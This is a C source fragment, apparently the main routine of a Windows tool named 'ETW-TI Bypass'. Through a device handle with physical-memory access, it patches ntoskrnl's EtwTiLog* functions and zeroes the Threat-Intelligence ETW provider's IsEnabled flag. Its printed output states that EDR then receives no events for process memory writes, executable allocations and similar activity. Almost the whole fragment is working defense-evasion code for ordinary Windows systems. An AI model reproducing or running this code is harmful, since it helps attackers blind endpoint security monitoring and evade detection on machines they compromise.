    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    BOOL ok=AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL);
    printf("[*] SeDebugPrivilege: %s\n",(ok&&GetLastError()==0)?"enabled":"FAILED");
    CloseHandle(hTok);
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("=== ETW-TI Bypass â€” Microsoft-Windows-Threat-Intelligence ===\n\n");
    printf("  GUID: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}\n\n");

    printf("  âš   WARNING â€” PatchGuard (KPP):\n");
    printf("     Method A patches ntoskrnl .text section.\n");
    printf("     PatchGuard will trigger a BSOD in approximately 5-10 minutes.\n");
    printf("     RESTORE before that window expires.\n");
    printf("     Method B (IsEnabled=0) is PatchGuard-safe.\n\n");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){printf("[-] Cannot open device: %lu\n",GetLastError());return 1;}
    printf("[+] Device opened\n");
    enable_debug_privilege();
    printf("\n");

    /* â”€â”€ Physical ranges â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    load_ranges();
    printf("[1] Physical ranges: %d\n",g_nranges);
    if(!g_nranges){printf("[-] No physical ranges\n");CloseHandle(g_dev);return 1;}
    for(int i=0;i<g_nranges;i++)
        printf("    [%d] 0x%016llX  %llu MB\n",i,
               (unsigned long long)g_ranges[i].base,
               (unsigned long long)(g_ranges[i].size>>20));
    printf("\n");

    /* â”€â”€ ntoskrnl VA + path â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    char nt_path[MAX_PATH]={0}; uint32_t nt_image_size=0;
    uint64_t nt_va=get_ntoskrnl_va(nt_path,&nt_image_size);
    printf("[2] ntoskrnl VA=0x%016llX  size=0x%X\n    Path=%s\n\n",
           (unsigned long long)nt_va,nt_image_size,nt_path);

    /* â”€â”€ Read ntoskrnl from disk â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){printf("[-] Cannot open ntoskrnl.exe\n");CloseHandle(g_dev);return 1;}
    DWORD pe_sz=GetFileSize(hf,NULL);
    uint8_t *pe_buf=(uint8_t*)malloc(pe_sz);
    DWORD rd=0; ReadFile(hf,pe_buf,pe_sz,&rd,NULL); CloseHandle(hf);
    printf("[3] ntoskrnl.exe read: %lu bytes\n\n",(unsigned long)pe_sz);

    /* â”€â”€ Find ntoskrnl PA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[4] Finding ntoskrnl PA (2MB NtBuildNumber scan)...\n");
    uint64_t nt_pa=find_ntoskrnl_pa(nt_path);
    if(!nt_pa){printf("[-] ntoskrnl PA not found\n");free(pe_buf);CloseHandle(g_dev);return 1;}
    printf("\n");

    SetConsoleCtrlHandler(ctrl_handler,TRUE);

    /* â”€â”€ Method A: patch EtwTiLog* exports â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[5] Method A â€” patching %llu EtwTiLog* exports:\n\n",
           (unsigned long long)(sizeof(ETW_TI_FUNCS)/sizeof(*ETW_TI_FUNCS)-1));
    int a_count=patch_etw_functions(pe_buf,pe_sz,nt_pa);
    printf("\n    Method A: %d function(s) patched\n\n",a_count);

    /* â”€â”€ Method B: disable via _ETW_GUID_ENTRY.ProviderEnableInfo â”€â”€â”€â”€â”€â”€ */
    printf("[6] Method B â€” disabling via _ETW_GUID_ENTRY.IsEnabled:\n\n");
    int b_ok=disable_provider_entry(nt_pa,nt_image_size);
    printf("    Method B: %s\n\n",b_ok?"IsEnabled zeroed":"not found");

    free(pe_buf);

    if(a_count==0&&!b_ok){
        printf("[-] Nothing patched â€” both methods failed.\n");
        CloseHandle(g_dev);return 1;
    }

    /* â”€â”€ Cache eviction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[7] Cache eviction (multi-CCD)... ");fflush(stdout);
    cache_evict_multiccd();
    printf("done\n\n");

    g_patched=1;

    printf("================================================================\n");
    printf("  ETW-TI provider: DISABLED\n\n");
    if(a_count>0){
        printf("  [A] %d EtwTiLog* function(s) patched â†’ xor eax,eax; ret\n",a_count);
        printf("      EDR receives no events for: RPM/WPM, alloc-exec,\n");
        printf("      map-exec, set-context, suspend/resume, open-process.\n");
        printf("      âš   PatchGuard BSOD in ~5-10 min â€” restore soon!\n\n");
    }
    if(b_ok){
        printf("  [B] _ETW_PROVIDER_ENABLE_INFO.IsEnabled = 0\n");
        printf("      Provider-level disable â€” PatchGuard-safe.\n\n");
    }
    printf("  Press Enter to RESTORE.  Ctrl+C also restores.\n");
    printf("================================================================\n");
    fflush(stdout); getchar();

    do_restore();

    /* â”€â”€ Verify restore â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[8] Verifying restore:\n");
    int v_ok=0,v_total=0;
    for(int i=0;i<g_n_fns;i++){
        if(!g_fns[i].ok) continue;
        v_total++;
        uint8_t cur[PATCH_LEN]={0};
        if(phys_read(g_fns[i].func_pa,cur,PATCH_LEN)&&
           memcmp(cur,g_fns[i].orig,PATCH_LEN)==0) v_ok++;
        else printf("    [!] %s may not be fully restored\n",g_fns[i].name);
    }
    if(g_isenabled_pa){
        v_total++;
        uint32_t cur=0;
        if(phys_read(g_isenabled_pa,&cur,4)&&cur==g_isenabled_orig) v_ok++;
        else printf("    [!] IsEnabled may not be restored (cur=0x%X)\n",cur);
    }
    printf("    Verified: %d/%d\n\n",v_ok,v_total);
    if(v_ok<v_total) printf("[!] Not all items restored â€” reboot recommended.\n\n");

    printf("[+] Done. ETW-TI provider re-enabled.\n");
    CloseHandle(g_dev);
    return 0;
}
